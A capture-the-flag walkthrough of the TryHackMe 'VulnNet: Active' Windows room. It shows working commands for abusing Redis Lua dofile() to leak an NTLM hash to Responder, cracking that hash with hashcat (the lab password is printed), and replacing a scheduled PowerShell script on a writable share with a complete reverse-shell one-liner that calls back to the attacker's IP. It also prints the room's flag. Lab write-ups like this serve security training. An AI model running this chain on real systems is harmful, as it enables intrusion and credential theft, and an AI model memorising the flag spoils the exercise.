VulnNet: ActivE Tryhackme walkthough


Initial access

running nmap scan to find services
```
death@esther:~$ nmap 10.49.187.239 -p 1-10000 -sV -sC -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-30 22:11 IST
Nmap scan report for 10.49.187.239
Host is up (0.074s latency).
Not shown: 9994 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
6379/tcp open  redis         Redis key-value store 2.8.2402
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-05-30T16:43:10
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 123.50 seconds

```

Smb (Port 445) — I start with smb, as it is one of the most common ports used in CTFs. Unfortunately, I don’t get anything useful.
```
~$ smbclient -L //<ip>
```
<img width="463" height="161" alt="image" src="https://github.com/user-attachments/assets/d9169280-75a1-4580-9621-637e80478f70" />
```
death@esther:~$ smbclient -L //10.49.187.239
Password for [WORKGROUP\death]:
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
```
Redis (Port 7379) — I try redis next, which is basically a database. It seems there is nothing in the keyspace — which means the database is empty. I can set the database directory with CONFIG SET. Perhaps I can get the server to connect to a fake remote server, and authenticate to me?
Connect to the Redist service and check the configurations, notice the windows user:
```
redis-cli -h $ip
config get *
```
when running config get *, I got a huge output with some important things:
12) "/var/run/redis.pid"
104) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"

<img width="753" height="643" alt="image" src="https://github.com/user-attachments/assets/c9351cd3-99fe-4b72-9c9e-af4502d978b1" />

So, we have got a user as enterprise-security.

Now, doing further enumeration, I didn’t find any shares on SMB with this user as well.

Redis exploitation#
An old RCE technique is to execute LUA code, it's not possible on newer version but since this is a very old one here we must try it.

We are able to make some chunk of data leak through error messages. That way we can read the user flag since we found the username earlier

https://medium.com/@d.bougioukas/red-team-diary-entry-2-stealthily-backdooring-cms-through-redis-memory-space-5813c62f8add

SMB credentials capturing#
LUA dofile() allows us to request a file but since we are on Windows it allows us to request a share as well dofile('//host/share').

So if we launch a SMB server with Responder on one hand and force the server to request a share on the other hand, we may be able to capture a NTLM hash.

Redis CLI:

In other terminal window start responder:
```
sudo ./Responder.py -I tun0
```
Run the following script inside the Redis service with your ip address:
```
eval "dofile('//<tun0 ip>/test')" 0
```

<img width="1115" height="103" alt="image" src="https://github.com/user-attachments/assets/add7221c-c11f-4a9f-bbd3-a7e1132945a4" />


Responder logs:

<img width="1117" height="366" alt="image" src="https://github.com/user-attachments/assets/948abbab-9689-4947-8ba8-8ddd57aa07cd" />

```
enterprise-security::VULNNET:1d6b443e32984ead:534FCACD7E6BAD29C4D8FB577D123CE7:010100000000000080A5AFBE7EF0DC0120EFF9ADD11F06200000000002000800320047003500370001001E00570049004E002D004800450051005600360045004D00340058005600440004003400570049004E002D004800450051005600360045004D0034005800560044002E0032004700350037002E004C004F00430041004C000300140032004700350037002E004C004F00430041004C000500140032004700350037002E004C004F00430041004C000700080080A5AFBE7EF0DC010600040002000000080030003000000000000000000000000030000039026FDD7E5E55EF0552F64B4D64A22B4F3D49CBAE51EA72A2B49AEE85F2D0190A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003100330038002E003100390030000000000000000000
```
```
death@esther:~$ hashcat --example-hashes | grep -A5 "NetNTLMv2"
  Name................: NetNTLMv2
  Category............: Network Protocol
  Slow.Hash...........: No
  Password.Len.Min....: 0
  Password.Len.Max....: 256
  Salt.Type...........: Embedded
--
  Name................: NetNTLMv2 (NT)
  Category............: Network Protocol
  Slow.Hash...........: Yes
  Password.Len.Min....: 32
  Password.Len.Max....: 32
  Salt.Type...........: Embedded
death@esther:~$ 
```
Let crack it with hashcat
```
death@esther:~$ hashcat -m 5600 hash.txt SecLists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i5-1240P, 14825/29714 MB (4096 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 4 MB

Dictionary cache hit:
* Filename..: SecLists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

ENTERPRISE-SECURITY::VULNNET:1d6b443e32984ead:534fcacd7e6bad29c4d8fb577d123ce7:010100000000000080a5afbe7ef0dc0120eff9add11f06200000000002000800320047003500370001001e00570049004e002d004800450051005600360045004d00340058005600440004003400570049004e002d004800450051005600360045004d0034005800560044002e0032004700350037002e004c004f00430041004c000300140032004700350037002e004c004f00430041004c000500140032004700350037002e004c004f00430041004c000700080080a5afbe7ef0dc010600040002000000080030003000000000000000000000000030000039026fdd7e5e55ef0552f64b4d64a22b4f3d49cbae51ea72a2b49aee85f2d0190a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100330038002e003100390030000000000000000000:sand_0873959498
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: ENTERPRISE-SECURITY::VULNNET:1d6b443e32984ead:534fc...000000
Time.Started.....: Sat May 30 21:56:42 2026 (1 sec)
Time.Estimated...: Sat May 30 21:56:43 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (SecLists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  4427.5 kH/s (2.31ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4014080/14344384 (27.98%)
Rejected.........: 0/4014080 (0.00%)
Restore.Point....: 3997696/14344384 (27.87%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: sapito19 -> sand400ex
Hardware.Mon.#1..: Temp: 93c Util: 46%
```
pass:
```
Username: enterprise-security
Password: sand_0873959498
```

Authenticated SMB enumeration#
Now that we have a valid domain account we can perform some authenticated SMB enumeration.

List shares:

```
death@esther:~$ smbmap -u enterprise-security -p sand_0873959498 -H 10.49.187.239 --no-banner
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.49.187.239:445	Name: 10.49.187.239       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Enterprise-Share                                  	READ, WRITE	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
death@esther:~$ 
```
And we can see the shares. Let’s check the Enterprise-Share
```
smbclient //10.49.177.104/Enterprise-Share -U 'enterprise-security%sand_0873959498'
```
```
death@esther:~$ smbclient //10.49.187.239/Enterprise-Share -U 'enterprise-security%sand_0873959498'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May 30 21:58:26 2026
  ..                                  D        0  Sat May 30 21:58:26 2026
  PurgeIrrelevantData_1826.ps1        A       69  Wed Feb 24 06:03:18 2021

		9558271 blocks of size 4096. 5092853 blocks available
smb: \> get PurgeIrrelevantData_1826.ps1 
getting file \PurgeIrrelevantData_1826.ps1 of size 69 as PurgeIrrelevantData_1826.ps1 (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> 
```
We have a single file here named PurgeIrrelevantData_1826.ps1 with contents:
```
death@esther:~$ cat PurgeIrrelevantData_1826.ps1 
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
death@esther:~$ 
```

Prepare a meterpeter multi handler session:
```
use exploit/multi/handler
set lhost tun0
set lport 4444
set payload windows/x64/powershell_reverse_tcp
run
```
Create a PurgeIrrelevantData_1826.ps1 file with the following content (put your IP address and port specified in meterpreter):
```
$client = New-Object System.Net.Sockets.TCPClient('192.168.138.190',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
Replace the same SMB file with the newly created one and wait:
```
smb: \> put PurgeIrrelevantData_1826.ps1
putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (1.3 kb/s) (average 1.3 kb/s)
smb: \> 
```
<img width="862" height="337" alt="image" src="https://github.com/user-attachments/assets/4803f45f-cf38-4b40-a9b5-1e35601adaee" />

## Capturing User flag.txt

```
PS C:\Users\enterprise-security\Downloads> cat C:\Users\enterprise-security\Desktop\user*      
THM{3eb176aee96432d5b100bc93580b291e}
PS C:\Users\enterprise-security\Downloads> 
```

  
